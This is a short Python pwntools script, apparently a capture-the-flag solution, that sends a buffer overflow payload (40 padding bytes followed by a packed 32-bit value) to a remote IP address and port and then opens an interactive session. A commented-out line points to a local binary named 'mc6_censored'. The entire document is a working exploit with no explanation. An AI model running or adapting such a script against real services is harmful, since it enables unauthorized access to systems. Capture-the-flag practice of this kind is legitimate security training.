from pwn import *

s = b"a"*40
s += p32(0xCC07C9)
sh = remote('109.233.56.90', 11586)#process('./mc6_censored')
input()
sh.sendline(s)
sh.interactive()
